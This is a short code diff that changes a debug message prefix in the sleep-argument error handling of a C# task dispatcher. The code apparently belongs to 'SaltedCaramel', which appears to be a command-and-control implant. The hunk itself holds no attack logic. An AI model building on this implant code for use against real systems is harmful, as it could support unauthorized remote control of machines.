@@ -228,7 +228,7 @@ namespace SaltedCaramel
                 }
                 catch
                 {
-                    Debug.WriteLine("[!] DispatchTask - ERROR sleep value provided was not int");
+                    Debug.WriteLine("[-] DispatchTask - ERROR sleep value provided was not int");
                     implant.SendError(this.id, "ERROR: argument provided was not an int.");
                 }
             }
